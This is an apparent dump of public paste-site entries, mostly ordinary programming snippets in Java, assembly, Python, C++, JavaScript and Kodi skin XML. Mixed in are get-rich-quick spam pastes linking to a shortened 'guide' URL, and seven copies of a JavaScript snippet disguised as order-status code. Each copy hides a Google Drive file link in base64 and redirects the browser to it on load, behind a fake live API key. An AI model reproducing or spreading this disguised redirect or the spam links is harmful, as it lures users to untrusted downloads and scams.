id,title,username,language,date,content
v4FG0mzy,EARN $900 INSTANTLY 2025 2U,bgftxc,JavaScript,Tuesday 15th of April 2025 12:54:17 PM CDT," 
Pdf https://tinyurl.com/privguidee


kWYGfAkCVt
"
RJxW7WWv,Untitled,kammex,JavaScript,Tuesday 15th of April 2025 12:45:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DE0gvcSu,[NP] Time Table,dzocesrce,Java,Tuesday 15th of April 2025 12:40:31 PM CDT,"import java.io.InputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.*;

class Time {
    private int hours;
    private  int minutes;
    private String timeOfDay;

    public Time(int hours, int minutes) {
        this.hours = hours;
        this.minutes = minutes;
        this.timeOfDay=""AM"";
    }

    public int getHours() {
        return hours;
    }

    public int getMinutes() {
        return minutes;
    }

    public static Time createTime(String s) throws UnsupportedFormatException, InvalidTimeException {
        int hours,minutes;

        if(s.contains(""."")){
            String[] parts= s.split(""\\."");
            hours= Integer.parseInt(parts[0]);
            minutes= Integer.parseInt(parts[1]);
        }
        else if(s.contains("":"")){
            String[] parts= s.split("":"");
            hours= Integer.parseInt(parts[0]);
            minutes= Integer.parseInt(parts[1]);
        }
        else{
            throw new UnsupportedFormatException(s);
        }
        if(hours>23||hours<0||minutes<0||minutes>59)
            throw new InvalidTimeException(s);

        return new Time(hours,minutes);
    }

    public String getTimeOfDay() {
        return timeOfDay;
    }

    public String changeToFormat24(){
        int new_hours;
        if(hours>12){
            new_hours=hours-12;
            timeOfDay=""PM"";
        }
        else if(hours==12){
            new_hours=12;
            timeOfDay=""PM"";
        }
        else if(hours==0){
            new_hours=hours+12;
        }
        else{
            new_hours=hours;
        }
        return String.format(""%2d:%02d %s"",new_hours,minutes,timeOfDay);


    }


    @Override
    public String toString() {
        return String.format(""%2d:%02d"",hours,minutes);
    }
}
class InvalidTimeException extends Exception{
    public InvalidTimeException(String message) {
        super(message);
    }
}

class UnsupportedFormatException extends Exception{
    public UnsupportedFormatException(String message) {
        super(message);
    }
}

public class TimesTest {

	public static void main(String[] args) {
		TimeTable timeTable = new TimeTable();
		try {
			timeTable.readTimes(System.in);
		} catch (UnsupportedFormatException e) {
			System.out.println(""UnsupportedFormatException: "" + e.getMessage());
		} catch (InvalidTimeException e) {
			System.out.println(""InvalidTimeException: "" + e.getMessage());
		}
		System.out.println(""24 HOUR FORMAT"");
		timeTable.writeTimes(System.out, TimeFormat.FORMAT_24);
		System.out.println(""AM/PM FORMAT"");
		timeTable.writeTimes(System.out, TimeFormat.FORMAT_AMPM);
	}

}

enum TimeFormat {
	FORMAT_24, FORMAT_AMPM
}

class TimeTable {
    private List<Time> times;

    public TimeTable() {
        times= new ArrayList<>();
    }

    public void readTimes(InputStream in) throws InvalidTimeException, UnsupportedFormatException {
        Scanner scanner = new Scanner(in);
        while(scanner.hasNextLine()){
            String line = scanner.nextLine();
            String[] parts = line.split(""\\s+"");
            for(String p : parts){
                Time time= Time.createTime(p);
                times.add(time);
            }
        }


    }

    public void writeTimes(PrintStream out, TimeFormat timeFormat) {
        PrintWriter printWriter = new PrintWriter(out);

        if(timeFormat.equals(TimeFormat.FORMAT_24))
            times.stream().sorted(Comparator.comparing(Time::getHours).thenComparing(Time::getMinutes))
                    .forEach(i-> printWriter.println(i));
        else{
            times.stream().sorted(Comparator.comparing(Time::getHours)
                            .thenComparing(Time::getMinutes))
                    .forEach(i-> printWriter.println(i.changeToFormat24()));
        }

        printWriter.flush();
    }
}"
fBAuxK0G,Make $1000 15-MINUTES (BEGINNER) FM,Payycrab,JavaScript,Tuesday 15th of April 2025 12:40:27 PM CDT," 
Pdf https://tinyurl.com/privguidee


PSdWTJcwPJ
"
21B5jBn4,Untitled,Artychenal,6502 TASM/64TASS,Tuesday 15th of April 2025 12:34:54 PM CDT,".model small
.stack 100h
.data
    title_msg       db ""Piecewise Function Calculator"", 13, 10, '$'
    equation_msg1   db ""Function Z is defined as:"", 13, 10, '$'
    equation_msg2   db ""   x-1               if x < 10"", 13, 10, '$'
    equation_msg3   db ""Z= (3x^2+4)/(x-2)    if x = 10"", 13, 10, '$'
    equation_msg4   db ""   (7x^2-56)/(2x-5)  if x > 10"", 13, 10, '$'
    instruction_msg db 13, 10, ""Press ESC to exit, any other key to continue..."", 13, 10, '$'
    prompt_msg      db 13, 10, 'Enter value of x: $'
    error_msg       db 13, 10, 'Invalid input! Please enter a valid number.$'
    overflow_msg    db 13, 10, 'Overflow occurred during calculation!$'
    div_zero_msg    db 13, 10, 'Error: Division by zero!$'
    result_msg      db 13, 10, 'Result: $'
    remainder_msg   db ' remainder $'
    newline         db 13, 10, '$'
    cont_msg        db 13, 10, 'Press ESC to exit or any key to continue...$'
    
    x               dw ?
    result          dw ?
    remainder       dw ?
    
    buffer          db 6, ?, 6 dup(?)  ; Buffer for input: max length, actual length, characters
    is_negative     db 0               ; Flag for negative input
    
.code
main proc
    mov ax, @data
    mov ds, ax
    
    ; Display title and equation system
    call display_equation_system
    
main_loop:
    ; Display prompt
    mov ah, 09h
    lea dx, prompt_msg
    int 21h
    
    ; Get user input
    call read_number
    
    ; Check for input errors
    cmp ax, 0
    je error_handler
    
    ; Store x value
    mov x, bx
    
    ; Calculate Z based on the value of x
    call calculate_z
    
    ; Display result
    call display_result
    
    ; Check if user wants to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    ; Wait for key press
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_program
    
    ; Clear screen for next calculation
    call clear_screen
    
    ; Display equation system again
    call display_equation_system
    
    ; Continue loop
    jmp main_loop
    
error_handler:
    mov ah, 09h
    lea dx, error_msg
    int 21h
    
    ; Check if user wants to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    ; Wait for key press
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_program
    
    ; Clear screen for next calculation
    call clear_screen
    
    ; Display equation system again
    call display_equation_system
    
    ; Continue loop
    jmp main_loop
    
exit_program:
    ; Exit program
    mov ax, 4C00h
    int 21h
main endp

; Procedure to display equation system and instructions
display_equation_system proc
    mov ah, 09h
    lea dx, title_msg
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg1
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg2
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg3
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg4
    int 21h
    
    mov ah, 09h
    lea dx, instruction_msg
    int 21h
    
    ret
display_equation_system endp

; Procedure to clear screen
clear_screen proc
    mov ax, 0003h  ; AH=0, AL=3 (text mode 80x25)
    int 10h
    ret
clear_screen endp

; Procedure to read a number from user input
read_number proc
    ; Read string
    mov ah, 0Ah
    lea dx, buffer
    int 21h
    
    ; Check if input is empty
    mov al, buffer[1]
    cmp al, 0
    je input_error
    
    ; Initialize registers
    xor bx, bx      ; BX will hold the result
    mov cl, buffer[1]  ; CL = length of input
    mov si, offset buffer + 2  ; SI points to first character
    
    ; Check for negative sign
    mov byte ptr [is_negative], 0
    cmp byte ptr [si], '-'
    jne check_digits
    
    ; Set negative flag and move to next character
    mov byte ptr [is_negative], 1
    inc si
    dec cl
    cmp cl, 0       ; Check if only minus sign was entered
    je input_error
    
check_digits:
    ; Process each digit
    xor ax, ax
    mov al, [si]
    
    ; Check if character is a digit (0-9)
    cmp al, '0'
    jb input_error
    cmp al, '9'
    ja input_error
    
    ; Convert ASCII to numeric value
    sub al, '0'
    
    ; Multiply current result by 10 and add new digit
    mov dx, 10
    mov ax, bx
    mul dx
    jc check_overflow  ; Check for overflow
    
    mov bx, ax
    mov al, [si]
    sub al, '0'
    
    ; Check for potential overflow before adding
    add bx, ax
    jc check_overflow  ; Check for overflow
    
    ; Check for maximum/minimum 16-bit integer values
    cmp byte ptr [is_negative], 1
    je check_negative_limit
    cmp bx, 32767   ; Check max positive value for signed 16-bit
    ja check_overflow
    jmp continue_reading
    
check_negative_limit:
    cmp bx, 32768   ; Check max negative value for signed 16-bit
    ja check_overflow
    
continue_reading:
    ; Move to next character
    inc si
    dec cl
    jnz check_digits
    
    ; Apply negative sign if needed
    cmp byte ptr [is_negative], 1
    jne read_done
    neg bx
    
read_done:
    mov ax, 1       ; Success
    ret
    
check_overflow:
    ; Handle overflow - display error and wait for keypress
    mov ah, 09h
    lea dx, overflow_msg
    int 21h
    
input_error:
    xor ax, ax      ; Error
    ret
read_number endp

; Procedure to calculate Z based on value of x
calculate_z proc
    mov ax, x
    cmp ax, 10      ; Compare x with 10
    jl less_than_10
    je equal_to_10
    jg greater_than_10
    
less_than_10:
    ; Z = x - 1
    mov ax, x
    dec ax
    mov result, ax
    mov remainder, 0
    ret
    
equal_to_10:
    ; Z = (3x² + 4) / (x - 2)
    ; Check for division by zero
    mov ax, x
    sub ax, 2
    cmp ax, 0
    je division_by_zero
    
    ; Calculate 3x²
    mov ax, x
    imul ax          ; AX = x²
    jo overflow_error
    mov bx, 3
    imul bx          ; AX = 3x²
    jo overflow_error
    
    ; Add 4
    add ax, 4
    jo overflow_error
    
    ; Divide by (x - 2)
    mov bx, x
    sub bx, 2
    
    ; Perform division
    cwd              ; Convert word to doubleword (sign extend AX into DX:AX)
    idiv bx          ; AX = quotient, DX = remainder
    
    mov result, ax
    mov remainder, dx
    ret
    
greater_than_10:
    ; Z = (7x² - 56) / (2x - 5)
    ; Check for division by zero
    mov ax, x
    shl ax, 1        ; AX = 2x
    sub ax, 5        ; AX = 2x - 5
    cmp ax, 0
    je division_by_zero
    mov bx, ax       ; Store denominator in BX
    
    ; Calculate 7x²
    mov ax, x
    imul ax          ; AX = x²
    jo overflow_error
    mov cx, 7
    imul cx          ; AX = 7x²
    jo overflow_error
    
    ; Subtract 56
    sub ax, 56
    jo overflow_error
    
    ; Divide by (2x - 5)
    cwd              ; Convert word to doubleword (sign extend AX into DX:AX)
    idiv bx          ; AX = quotient, DX = remainder
    
    mov result, ax
    mov remainder, dx
    ret
    
division_by_zero:
    mov ah, 09h
    lea dx, div_zero_msg
    int 21h
    
    ; Wait for key press to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_div_zero
    
    ; Clear screen and display equation system
    call clear_screen
    call display_equation_system
    
    ; Return to main loop
    jmp main_loop
    
exit_div_zero:
    mov ax, 4C01h    ; Exit with error code
    int 21h
    
overflow_error:
    mov ah, 09h
    lea dx, overflow_msg
    int 21h
    
    ; Wait for key press to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_overflow
    
    ; Clear screen and display equation system
    call clear_screen
    call display_equation_system
    
    ; Return to main loop
    jmp main_loop
    
exit_overflow:
    mov ax, 4C02h    ; Exit with error code
    int 21h
calculate_z endp

; Procedure to display calculation result
display_result proc
    mov ah, 09h
    lea dx, result_msg
    int 21h
    
    ; Display quotient (result)
    mov ax, result
    call display_number
    
    ; Check if there's a remainder to display
    mov ax, remainder
    cmp ax, 0
    je no_remainder
    
    ; Display remainder part
    mov ah, 09h
    lea dx, remainder_msg
    int 21h
    
    mov ax, remainder
    call display_number
    
no_remainder:
    mov ah, 09h
    lea dx, newline
    int 21h
    ret
display_result endp

; Procedure to display a signed number
display_number proc
    ; Check if number is negative
    test ax, ax
    jns positive_number
    
    ; Display minus sign
    push ax
    mov dl, '-'
    mov ah, 02h
    int 21h
    pop ax
    
    ; Convert to positive
    neg ax
    
positive_number:
    ; Convert number to string
    mov bx, 10      ; Divisor
    mov cx, 0       ; Digit counter
    
digit_loop:
    xor dx, dx
    div bx          ; AX / 10: quotient in AX, remainder in DX
    push dx         ; Push digit on stack
    inc cx          ; Increment digit counter
    test ax, ax
    jnz digit_loop  ; Continue if quotient is not zero
    
display_loop:
    pop dx          ; Get digit from stack
    add dl, '0'     ; Convert to ASCII
    mov ah, 02h
    int 21h         ; Display character
    loop display_loop
    
    ret
display_number endp

end main"
UP67FBX9,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 12:30:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4gUvgSE4,EARN $900 INSTANTLY 2025⭐ G8,Payycrab,JavaScript,Tuesday 15th of April 2025 12:27:02 PM CDT," 
Pdf https://tinyurl.com/privguidee


eoUieKxOIA
"
8u70d0ks,cf.asn.neighbours,rgruber,JavaScript,Tuesday 15th of April 2025 12:21:27 PM CDT,"let asns=(await fetch(""https://radar.cloudflare.com/charts/BgpRoutesAsnsCard/fetch"").then(r=>r.json())).asns;
let rel={};
for (var x of asns) {
    let rels= (await fetch(""https://radar.cloudflare.com/charts/BgpRoutesRelsTable/fetch?location=as""+x.asn).then(r=>r.json())).rels;
    console.log(x.asn,x.name,x.country, rels.upstreams.map(v=>v.asn), rels.peers.map(v=>v.asn),rels.downstreams.map(v=>v.asn));
    x.neighbours=rels.upstreams.length+rels.peers.length+rels.downstreams.length;
    x.ipv6Count=Number(x.ipv6Count);
    rel[x.asn]={};
    rel[x.asn].upstreams=rels.upstreams.map(v=>v.asn);
    rel[x.asn].peers=rels.peers.map(v=>v.asn);
    rel[x.asn].downstreams=rels.downstreams.map(v=>v.asn);
    x.bgpUpstreams=rels.upstreams.length;
    x.bgpPeers=rels.peers.length;
    x.bgpDownstreams=rels.downstreams.length;
}"
sPaYjKDY,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 12:14:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23228/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xcRfkU32,Make $1000 15-MINUTES  (BEGINNER) HV,Payycrab,JavaScript,Tuesday 15th of April 2025 12:13:35 PM CDT," 
Pdf https://tinyurl.com/privguidee


DDEDCyxAfs
"
P36cp4F8,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 11:59:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20250/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hfsbvRSE,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 11:44:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08901/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WiRfdFSX,white noise image generator,int8,C++,Tuesday 15th of April 2025 11:42:42 AM CDT,"#include <random>
#include <SFML/Graphics.hpp>
#include ""globals.h""

using namespace typ;

const u32 VIDW = 800, VIDH = 600;

std::random_device rd;
std::mt19937 gen;
std::uniform_int_distribution<> distrib(0, 255);

sf::Image *img_generate(u32 w, u32 h, u32 selection=0, u32 variation=0)
{
	u32 setalpha=0;
	u8 pixels[(w*h*4)];
	switch(selection)
	{
	case 0: //randomized data, colorized white noise
		for (int i=0;i<w*h*4;i++)
		{
			if(setalpha == 3)
			{
				pixels[i] = 0xff;
				setalpha = 0;
			}
			else
			{
				pixels[i] = distrib(gen);
				setalpha++;
			}
		}
		return new sf::Image(sf::Vector2u(w,h),pixels);
		break;
	case 1: //variation 0 for red, 1 for green, 2 for blue

		for (int i=0;i<w*h*4;i++)
		{
			if(setalpha == 3)
			{
				pixels[i] = 0xff;
				setalpha = 0;
			}
			else
			{
				if(setalpha == variation) pixels[i] = 255;
				else pixels[i] = 0;				
				setalpha++;
			}
		}
		return new sf::Image(sf::Vector2u(w,h),pixels);
		break;
	}
	return 0;
}



int main()
{
	std::mt19937 gen(rd());

	sf::RenderWindow window(sf::VideoMode({VIDW, VIDH}), ""SFML C++ demo!"");
	sf::CircleShape shape(100.f);
	shape.setFillColor(sf::Color::Green);

	sf::Font font(""anonymous_pro.ttf"");
	sf::Text text(font);
	text.setString(""truetype font render"");
	text.setCharacterSize(48);
	text.setFillColor(sf::Color::Black);
	text.setPosition(sf::Vector2f(64,64));

	sf::Image img = *img_generate(800,600,0);
	//img.saveToFile(""rainbow-snow.png"");
	
	sf::Texture tex(img);
	sf::Sprite spr(tex);
	const auto onClose = [&window](const sf::Event::Closed&)
	{
		window.close();
	};

	const auto onKeyPressed = [&window](const sf::Event::KeyPressed& keyPressed)
	{
		if (keyPressed.scancode == sf::Keyboard::Scancode::Escape)
			window.close();
	};

	while (window.isOpen())
	{
		window.handleEvents(onClose, onKeyPressed);
		while (const std::optional event = window.pollEvent())
		{
			if (event->is<sf::Event::Closed>())
				window.close();
		}

		window.clear(sf::Color::Black);
		window.draw(spr);
		window.draw(text);
		window.display();
	}
}"
SvxzDNeP,A20250415_flipkart_strings,Kali_prasad,Python,Tuesday 15th of April 2025 11:41:47 AM CDT,"'''
A20250415_flipkart_strings

given you a string
need to make it lexographically smallest string by doing 
one operation

operation pick any character and place it anywhere else


-----------------------------------------------------------------------------------------------------
important thing to be noted is

the main nature of lexographic is ,the first characters in the string should be as small as possible
how do we know where to place
lets have a reference of smallest lexographic string
which is obtained by sorting string characters
now compare it with every char of original 
when there is a mismatch we know the position now at this point print the ideal character and 
from now on continue printing the other
however if you encountered ideal character again through the original string,if it is the last occurance skip it

skipping the last occarance instead of first occurance in problematic part
 will make us to have the smallest possible lexographic string

say you have
BCCCAADAAD //given
AAAABCCCDD //sorted

ABCCCAADAD //ans when we picked right most A
ABCCCADAAD //ans when we picked left most A

so it is evident to choose the right most than the left most A

-----------------------------------------------------------------------------------------------------
input - 
BCCCAADAAD

output - 
ABCCCADAAD

'''

givenStringArr = list(input())
sortedStringArr = sorted(givenStringArr)
fMap = {}
for char in givenStringArr:
    if char in fMap:
        fMap[char] += 1
    else:
        fMap[char] = 1
firstMismatchFound = False
idealChar = '#'
for i in range(len(givenStringArr)):
    # print('givenStringArr ',givenStringArr[i])
    # print('sortedStringArr ',sortedStringArr[i])
    if not firstMismatchFound and givenStringArr[i] == sortedStringArr[i]:
        print(givenStringArr[i],end='')
        fMap[givenStringArr[i]] -= 1
    elif not firstMismatchFound and givenStringArr[i] != sortedStringArr[i]:
        firstMismatchFound = True
        print(sortedStringArr[i],end='')
        fMap[sortedStringArr[i]] -= 1
        print(givenStringArr[i],end='')
        fMap[givenStringArr[i]] -= 1
    elif firstMismatchFound and fMap[givenStringArr[i]] > 0:
        print(givenStringArr[i],end='')
        fMap[givenStringArr[i]] -= 1



"
RBFqaai6,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 11:28:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47024/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7faKN5dS,Untitled,emveepee,XML,Tuesday 15th of April 2025 11:19:32 AM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<includes>
	<expression name=""listitem_has_episode_info"">!String.IsEmpty(ListItem.Episode) | !String.IsEmpty(ListItem.EpisodeName) | !String.IsEmpty(ListItem.Season)</expression>
	<expression name=""listitem_has_epg_event_info"">!String.IsEmpty(ListItem.EpgEventTitle) | !String.IsEmpty(ListItem.TitleExtraInfo) | $EXP[listitem_has_episode_info]</expression>
	<include name=""PVRListItemLayout"">
		<definition>
			<control type=""label"">
				<left>30</left>
				<top>0</top>
				<right>30</right>
				<font>font36_title</font>
				<aligny>center</aligny>
				<visible>$PARAM[only_label_condition]</visible>
				<label>$INFO[ListItem.Label]</label>
			</control>
			<control type=""group"">
				<visible>!$PARAM[only_label_condition]</visible>
				<animation effect=""slide"" start=""0,0"" end=""0,16"" time=""0"" condition=""!$EXP[listitem_has_epg_event_info] + String.IsEmpty(ListItem.Comment)"">Conditional</animation>
				<control type=""image"">
					<left>29</left>
					<top>17</top>
					<width>32</width>
					<height>32</height>
					<aspectratio align=""center"">keep</aspectratio>
					<visible>$PARAM[has_info_icon]</visible>
					<texture>$PARAM[info_icon]</texture>
				</control>
				<control type=""label"">
					<left>10</left>
					<top>10</top>
					<width>90</width>
					<height>50</height>
					<align>center</align>
					<aligny>center</aligny>
					<font>font32_title</font>
					<visible>!$PARAM[has_info_icon]</visible>
					<label>$PARAM[label0]</label>
				</control>
				<control type=""label"">
					<left>105</left>
					<right>120</right>
					<top>10</top>
					<height>30</height>
					<aligny>top</aligny>
					<label>$PARAM[label1]</label>
				</control>
				<control type=""label"">
					<left>105</left>
					<right>120</right>
					<top>10</top>
					<height>30</height>
					<align>right</align>
					<aligny>top</aligny>
					<label>$PARAM[label2]</label>
				</control>
			</control>
			<control type=""group"">
				<visible>!$PARAM[only_label_condition]</visible>
				<control type=""label"">
					<left>105</left>
					<right>120</right>
					<top>53</top>
					<height>30</height>
					<font>font12</font>
					<aligny>top</aligny>
					<label>$PARAM[label3]</label>
				</control>
				<control type=""label"">
					<left>105</left>
					<right>120</right>
					<top>53</top>
					<height>30</height>
					<font>font12</font>
					<align>right</align>
					<aligny>top</aligny>
					<label>$PARAM[label4]</label>
				</control>
			</control>
			<control type=""image"">
				<right>110</right>
				<top>0</top>
				<width>32</width>
				<aligny>center</aligny>
				<aspectratio align=""center"">keep</aspectratio>
				<texture>$VAR[PVRStatusImageVar]</texture>
				<visible>$PARAM[has_status_icon]</visible>
			</control>
			<control type=""image"">
				<right>20</right>
				<top>0</top>
				<width>80</width>
				<aligny>center</aligny>
				<aspectratio align=""center"">keep</aspectratio>
				<visible>!$PARAM[only_label_condition] | ListItem.IsParentFolder</visible>
				<texture>$INFO[ListItem.ActualIcon]</texture>
			</control>
		</definition>
	</include>
	<include name=""PVRListItemLayouts"">
		<param name=""only_label_condition"">false</param>
		<param name=""has_info_icon"">false</param>
		<param name=""has_status_icon"">false</param>
		<param name=""info_update"">0</param>
		<definition>
			<itemlayout height=""100"" infoupdate=""$PARAM[info_update]"">
				<control type=""progress"">
					<left>20</left>
					<top>66</top>
					<width>70</width>
					<height>12</height>
					<colordiffuse>88FFFFFF</colordiffuse>
					<visible>ListItem.HasEpg + !$PARAM[has_info_icon]</visible>
					<info>ListItem.Progress</info>
				</control>
				<include content=""PVRListItemLayout"">
					<param name=""only_label_condition"" value=""$PARAM[only_label_condition]"" />
					<param name=""info_icon"" value=""$PARAM[info_icon]"" />
					<param name=""has_info_icon"" value=""$PARAM[has_info_icon]"" />
					<param name=""has_status_icon"" value=""$PARAM[has_status_icon]"" />
					<param name=""label0"" value=""[COLOR grey]$INFO[ListItem.ChannelNumberLabel][/COLOR]"" />
					<param name=""label1"" value=""$PARAM[label1]"" />
					<param name=""label2"" value=""$PARAM[label2]"" />
					<param name=""label3"" value=""$VAR[PVRListItemSubLabel]"" />
					<param name=""label4"" value=""[COLOR grey]$INFO[ListItem.Comment][/COLOR]"" />
				</include>
			</itemlayout>
			<focusedlayout height=""100"" infoupdate=""$PARAM[info_update]"">
				<control type=""image"">
					<left>0</left>
					<top>0</top>
					<right>0</right>
					<animation effect=""fade"" start=""100"" end=""0"" time=""0"">UnFocus</animation>
					<texture colordiffuse=""button_focus"">lists/focus.png</texture>
					<visible>Control.HasFocus($PARAM[list_id])</visible>
				</control>
				<control type=""progress"">
					<left>20</left>
					<top>66</top>
					<width>70</width>
					<height>12</height>
					<midtexture border=""3"">progress/texturebg_white.png</midtexture>
					<visible>ListItem.HasEpg + !$PARAM[has_info_icon]</visible>
					<info>ListItem.Progress</info>
				</control>
				<include content=""PVRListItemLayout"">
					<param name=""only_label_condition"" value=""$PARAM[only_label_condition]"" />
					<param name=""info_icon"" value=""$PARAM[info_icon]"" />
					<param name=""has_info_icon"" value=""$PARAM[has_info_icon]"" />
					<param name=""has_status_icon"" value=""$PARAM[has_status_icon]"" />
					<param name=""label0"" value=""$INFO[ListItem.ChannelNumberLabel]"" />
